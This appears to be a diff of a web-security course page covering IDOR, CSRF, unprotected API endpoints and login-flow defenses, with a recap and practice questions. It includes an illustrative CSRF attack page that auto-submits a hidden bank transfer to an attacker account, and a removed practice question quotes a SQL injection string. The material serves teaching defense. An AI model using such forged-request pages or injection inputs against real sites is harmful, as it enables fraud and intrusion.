+<p>Alice views her own invoice (<code>id=1002</code>) with her own session cookie. She then edits the URL to a neighbouring id. The server answers <strong>200 OK, and Bob's invoice comes back anyway.</strong> <strong>Fix:</strong> every handler that loads a record by id must check, <strong>server-side</strong>, that the record's owner matches the current session, not just that a valid session exists. <strong>Never trust that a user will only ever ask for their own ids.</strong></p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5w5pR5Emp0KXU7TJt780WnMqtQBrD8KeGuC3Ec8X6wTgt9LspUodLPvUqHL2IPOpv6-VvCBfJ86R-w6HCT0y3JfM9035ufao1LDg5elZYjGHci6IaMS31GBgexJcTFrwKmBkqQ71hkNFMOIpogEdwHVpUjwyHwVLK_23JBdB1e_f5_HjsjlW-bWxHej6bnxznatuqzv-R-CXrp4UtnoWbxYuw_IegxnzWfhiTN3Jn5E0sSSo9r0SRhGP3OS-p7uBvNfOxW"></div>
+<h3 class="atx" id="scenario-2--cross-site-request-forgery-csrf">Scenario 2 — Cross-Site Request Forgery (CSRF)</h3>
+<p>The victim is <strong>already logged into <code>bank.example</code> in another tab.</strong> They load a page the attacker controls, which holds a hidden form and a script that auto-submits it. The browser <strong>attaches the session cookie automatically</strong> to any request to that domain, including this hidden one, so the bank sees a "legitimate" transfer. <strong>Fix:</strong> mark the session cookie <code>SameSite=Lax</code> or <code>Strict</code> (already covered) so it isn't sent on cross-site requests, <strong>and</strong> require a <strong>CSRF token</strong>: a random value the real form must echo back, which the evil page could never know.</p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vLa3zh0a4KnFlz59Ehb7Z69esWo85r0WbNsJntdtSFzy-n-rRqsmSLX5HJp6-6ONP5AMiDthnDcOP0y7HBLL42AqKoP3LbDBrObN28Cv-6WHqaGXEE5C_p1bJGcucoYfM9egBXY_YsYF9orE0VnFu_SOyk-KfXylpmEzEZtMAFDNmYLw0ZOwA1pHvjkqMFDKPnZYDEAGUyezWiaq97KfHw3A85ei-Q3cjyV_tyuaCpnNBYZ9cc3QcIFNDkoTfKeov0uQwRpzLgDJz4cz9P60ziP0UgcWAfMFB-PhhNa5SfNzbMPOVPfVh8cOwUdxUO7KTNW_y3B6rtjW"></div>
+<p>The attacking page (course illustration):</p>
+<pre><code class="fenced-code-block language-html"><span class="token comment">&lt;!-- evil-site.html -- the victim just has to load this page --&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://bank.example/transfer<span class="token punctuation">"</span></span>
+      <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>f<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>to<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>attacker-account<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>amount<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5000<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre>
+<h3 class="atx" id="scenario-3--an-unprotected-api-endpoint">Scenario 3 — An Unprotected API Endpoint</h3>
+<p>In <code>TaskItem.jsx</code>, the delete button is hidden from regular users with <code>{isAdmin &amp;&amp; &lt;button onClick={deleteTask}&gt;Delete&lt;/button&gt;}</code>. But <strong>hiding a button is a frontend decision, not a security control.</strong> A regular user simply calls the endpoint directly, for example with <code>curl</code>, <strong>no button needed.</strong> <strong>Fix:</strong> check authorization <strong>on the server for every request</strong> to <code>/api/tasks/5</code>, regardless of whether it came from a click or a hand-crafted request, <strong>and add rate limiting</strong>, so even authorized calls can't be hammered thousands of times a second.</p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vjZh5Emq0GHFlxYi5L8h1IqLWYYWIXeiAuYuGMU-MiSjupUtiMuUjH0YNjpEYzsMKdypB5S3CRZHCXqZaLHvxOIIbGxybGlV9O8XbAPZlegcJH4NsnkAv06LsOoLnwcKaTLSksi5sRDdIejsZHu6d_id_ROqEpR9poAM_k3_gOqacuGUQS9Ucx30_swwelhlel3otgUeiE3LPBYSf67v7Nk70mS6JduGwQGCMFoUIRN9AYFt9_2fgSaHQswurd-Mh-co4fU64xm_YpSFQ3tiB86L4cST4nx5Y7CiKVntLi3W"></div>
+<h3 class="atx" id="scenario-4--securing-the-login-flow">Scenario 4 — Securing the Login Flow</h3>
+<p>The same walkthrough from Module 5, now read as a <strong>checklist of where a login flow can be attacked and what defends each step.</strong> Credentials travel over HTTPS (so they are encrypted in transit). The server hashes the submitted password and compares it to the stored hash, <strong>never storing or reading plaintext</strong>. The query is parameterized, so it is <strong>immune to SQL injection</strong>. The session cookie is set with <code>Secure; HttpOnly; SameSite=Lax</code>. Later requests carry it automatically over HTTPS, and <strong>every page that shows account data checks whether this session is allowed to see it (authorization).</strong></p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vLaLrh6q4CHT_tLzpcfJR4M_eDDac3-n9A80dZnuKWpmhlD3EQhKORP_FhopenRbzrfNFXwAeOgGqfLkzwfLqYH1hpO2Y9ZOIgdjI23ps9uMojULzOpq05w_yZn_hqbhXgZSKb79RuMEFkrctm8UPT4EGdLbnlDdUk4Q_SibYWMC3YTUoDMmI1AKa9LhaZv5EDZag7CcnJi6chfrBsMTlpHdnEFId3CefbvVQmsyXCU2exp0hwI46Cdsr-mdwkqPDIOcCDBzoY61ad5ciaf3J80UhkRn3aDtiBMQRZnINMME9B3SUs-9dpO-0b2fSIiZo4zgAkwrKZZlsWlCArMNyhSLp1KM8NZ2zkwBcIRFogOu9zhU4F87YIzuOjGvbQR4VySfWT6VD6igAmsCaaPgzDyvFqRpKY6IkK_mnShC2JwWZh-Asc4Hei9xBWASRndx-Sz7olCHaSqTEEKRgy3x83UPy7CRHa1D-nVopBHaA1TQ4SBO1Yp7jk3qzXHh0VcD5WNTRmGfF8UNN5qWuf_WNQWDfv"></div>
+<blockquote>
+<p><strong>Note for Review — Pro-Tip:</strong> IDOR, CSRF and the unprotected endpoint are <strong>the same lesson three times: never trust a check the client can bypass.</strong> Verify ownership, tokens and authorization again on the server.</p>
+</blockquote>
+<hr>
+<h2 class="atx" id="security-recap">Security Recap</h2>
+<ul>
+<li>The <strong>OWASP Top 10</strong> is the industry's shared map of what actually gets exploited. This module focused on <strong>injection, authentication, access control and cryptographic failures.</strong></li>
+<li><strong>SQL injection and XSS are both injection attacks:</strong> untrusted input reinterpreted as code, in a database engine or a browser respectively. <strong>Parameterized queries</strong> and <strong>proper escaping</strong> defend against each.</li>
+<li><strong>Authentication</strong> (who you are) and <strong>authorization</strong> (what you can do) are <strong>separate checks, and both must hold for every request.</strong></li>
+<li><strong>HTTPS/TLS</strong> protects data in transit; <strong>Secure, HttpOnly and SameSite</strong> cookies each defend against a distinct attack.</li>
+<li><strong>Secure coding is mostly discipline:</strong> validate on the server, grant least privilege, keep dependencies current, and never hardcode a secret.</li>
+<li><strong>IDOR, CSRF and an unprotected API endpoint</strong> are the same lesson three times over: never trust a check the client can bypass; verify ownership, tokens and authorization again on the server.</li>
+</ul>
+<p>The big picture: a good web application needs <strong>responsive design</strong> (users shouldn't feel they are waiting), <strong>performance</strong> (millions of clients, cost), and <strong>security</strong>, which has to be ensured from the start. These topics reach down into operating systems, networks and cryptography, so keep exploring them beyond this course and apply them in your assignments, lab experiments and professional work.</p>
 <hr>
 <h2 class="atx" id="practice-questions">Practice Questions</h2>
-<p>These are scenarios, not definitions. Think them through before looking anything up.</p>
-<p><strong>1. The stolen session.</strong> A university portal sets its login cookie as <code>Set-Cookie: session_id=...</code> with no further attributes, and the site is also reachable over plain HTTP. A student pastes a clever comment into a discussion forum on the portal, and later a classmate's account is used without their password. Walk through, step by step, how the attacker could have got hold of the session. Which two cookie attributes close which holes, and why would setting only one of them still leave you exposed? What would still be possible even after both are set?</p>
-<p><strong>2. The leaked table.</strong> A small shop's user table leaks. Alice and Bob chose the same password. In version A the shop stored plain text, in version B an unsalted hash, in version C a salted hash. For each version, what can an attacker conclude about Alice and Bob and about other users on other sites? Then explain why this same shop, after the leak, can still offer a "forgot password" button, what exactly that email contains, and what it tells you about what the shop actually knows.</p>
-<p><strong>3. One query, two programs.</strong> You write <code>list_instructors.php</code> and <code>list_instructors.js</code> running the same query. A friend opens each one in a browser. Describe what they see in each case, and what extra pieces the Node.js version needs before it can serve the same listing to a browser. Which parts of the lecture's "web server plus application plus database" picture does each piece map to? Finally, a user types <code>Comp. Sci.' OR '1'='1</code> into a search box that feeds the query: how do the two programs differ in what happens, and why?</p>
-<p><strong>4. Where does the count live?</strong> A feed shows fifty posts, each with a <code>LikeButton</code>. The product manager now asks for two changes: (a) swap the heart for a thumbs-up, and (b) show "Total likes on this page" in a header bar. Where would you make change (a), and how many places does it touch compared with the three-file approach? For change (b), where must the like counts live, and what must flow down and what must bubble up for the header and the buttons to stay in agreement? What goes wrong if each button keeps its own private count?</p>
-<p><strong>5. Refresh and sign-out.</strong> You tap Like on a post and the number jumps from 56 to 57 without the page flashing. Trace what the browser and the server each do, and say which layer stays unchanged throughout. Then refresh the page: depending on how the app was built, the count may be 56 or 57. Explain what decides which one you see, and which kind of state was lost or kept. Last, if you sign out and the cart you had filled is still there when you sign in again tomorrow, explain which pieces (cookie, session record, account row) were deleted at sign-out and which one is holding your cart.</p>
+<p>These are not recall questions. Reason them through.</p>
+<ol>
+<li><p><strong>The ticking dashboard.</strong> A trading dashboard shows 2,000 rows, and exactly one price cell changes every second. Compare what happens under (a) hand-written <code>textContent</code> updates, (b) a framework with a virtual DOM, and (c) wiping and rebuilding the whole table with <code>innerHTML</code>. Then argue for or against using no framework at all if the page were a single static calculator with three widgets.</p>
+</li>
+<li><p><strong>The hidden button.</strong> TaskNest hides the Delete button from regular users, and its backend only checks that a <em>valid session exists</em>. List everything a logged-in regular user could do, name the OWASP categories involved, and describe the minimum set of server-side changes that closes the hole. Why does adding client-side checks make nothing better here?</p>
+</li>
+<li><p><strong>The café Wi-Fi test.</strong> A user logs in to your site on public Wi-Fi. For each of these, say what an eavesdropper (or attacker) gains if <em>only that one</em> defense is missing while the rest are in place: HTTPS, the <code>Secure</code> flag, <code>HttpOnly</code>, <code>SameSite</code>, password hashing in the database. Which of these failures are visible to the eavesdropper, and which only matter later?</p>
+</li>
+<li><p><strong>The "safe" framework.</strong> Your React app escapes everything by default, yet one developer renders user bios using an explicit opt-out to allow bold text. Explain what attack this reopens and why other layers may still save you. If an attacker's script runs anyway on a page with <code>HttpOnly</code> cookies and a strict Content-Security-Policy, what can they no longer do, and what <em>might</em> they still be able to do?</p>
+</li>
+<li><p><strong>Landing pages and dashboards.</strong> A company needs ten marketing pages that must rank well in search, plus a logged-in dashboard that updates constantly. Design a hybrid architecture (SPA, MPA, server-side rendering) and justify each choice using the SPA trade-offs. Then suppose the dashboard (on <code>app.example</code>) calls an API on <code>api.example</code> and the browser blocks it. Explain which policy is responsible, how the API owner should fix it, and why "allow every origin" is a poor fix for an API that uses cookie-based sessions.</p>
+</li>
+</ol>
 </article>
 </body>
 </html>
